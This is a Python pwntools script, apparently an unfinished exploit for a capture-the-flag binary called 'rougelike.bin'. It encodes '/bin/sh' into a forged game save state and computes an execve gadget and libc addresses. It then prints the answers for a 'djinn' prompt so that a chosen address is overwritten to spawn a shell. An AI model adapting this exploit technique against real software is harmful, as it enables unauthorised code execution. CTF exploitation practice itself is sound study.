
import os
import pwn
import sys
import random
import re


pwn.context.log_level = 'error'


execve_gadget = 0x00005555555633a3
rdi_content = 0x7fffffffd5d0
# /bin/sh:  0x68732F6E69622F
            

bin_sh = 0x68732F6E69622F


weapon = 0x00000000
armor = 0x00000000
hp = (bin_sh & 0xffffffff) * 2  # the lower 32 bits of the address has to be multiplied by 2, because djinn divides hp by 2.
healing_potions = 0x00000000
poisons = 0x00000000
gold = 0x00000000
gender = 0x00000010

def lsb_hex(v):
    st = format(v, 'x').zfill(8)
    bytes = re.findall('..', st)
    return ''.join(bytes[::-1])

save_state=''.join([lsb_hex(v) for v in [weapon, armor, hp, healing_potions, poisons, gold, gender]])

print()
print(f'save_state: {save_state}')

# conn = pwn.process('./rougelike.bin')
# #conn = pwn.remote('challenges.crysys.hu', 5010)
# conn.sendlineafter('>', '1')
# conn.sendlineafter('>', '5')
# conn.sendlineafter('state: ', save_state)
# conn.sendlineafter('>', '2')





def addr_from_shop(addr):
    shop_addr = 0x0000555555561a40 # shop
    return shop_addr - 0x0010da40 + addr

def addr_from_libc(addr):

    libc_base = 0x00007ffff7ca0c50 - 0x27c50
    return addr + libc_base

def djinn(addr):

    # conn.sendlineafter('? ', 'yes')

    addr_lower = ((addr & 0xffffffff) << 32) + 0x11111111
    addr_upper = ((0x11111111) << 32) + (addr >> 32)

    
    print(f'AAAAAAAA: 0')
    print(f'Unix timestamp: 0')
    print(f'Richard Stallman: 0')
    print(f'Rust standard library {bin_sh >> 32}')
    print(f'Linux released: {addr_lower}')
    print(f'SecChallenge: {addr_upper}')
    print(f'What is the closest even prime to: {0}')
    print(f'3↑↑3: {0}')

    # for i in range(15):
    #     r = conn.recvuntil('? ').decode('utf-8')
    #     print(r)
    #     if 'Linux released' in r:
    #         conn.sendline(str(addr_lower))
    #     elif 'SecChallenge' in r:
    #         conn.sendline(str(addr_upper))
    #     else:
    #         conn.sendline('16705') 

    # r = conn.recvuntil('>').decode('utf-8')
    # print(r)
    # conn.sendline('2')

def no_djinn():
    conn.sendlineafter('? ', 'no')


djinn(execve_gadget)




# while True:
#     r = conn.recvline()#.decode('utf-8')
#     print(r)
# # print('x')
# # conn.sendlineafter('What is the best number?', '1')
# # conn.sendlineafter('What is the 19th happy prime?', '1')
# # conn.sendlineafter('What is the order of the Lyons group?', '1')
# # conn.sendlineafter('Sum all natural numbers; take the reciprocal, then multiply it by -1. What do you get?', '1')
# # conn.sendlineafter('What is the reciprocal of the fine structure constant?', '1')
# # conn.sendlineafter('AAAAAAAA (hint: https://www.youtube.com/watch?v=bknybcgfjAk)?', '1')
# # conn.sendlineafter('What was the Unix timestamp when this challenge was developed?', '1')
# # conn.sendlineafter('When did Richard Stallman started the GNU project?', '1')
# # conn.sendlineafter("How many times does the unsafe keyword appear in the source code of the Rust standard library's source code?", '1')
# # conn.sendlineafter("When was the first version of Linux released?", '1')
# # conn.sendlineafter("How many challenges remained unsolved during last year's SecChallenge?", '1')
# # conn.sendlineafter("What is the closest even prime", '1')


# while True:
#     r=conn.recvline().decode('ascii')
#     print(r)
#     conn.sendline('1')
# # r = conn.recvline().decode('ascii')
# # conn.sendline(str(len(fileContent)))
# # r = conn.recvline().decode('ascii')
# # conn.send(fileContent)
# # r = conn.recvall().decode('ascii')
# # print(r)
# # conn.close()


# # if addr == 0x41c020:
# #     print(i)
# #     break
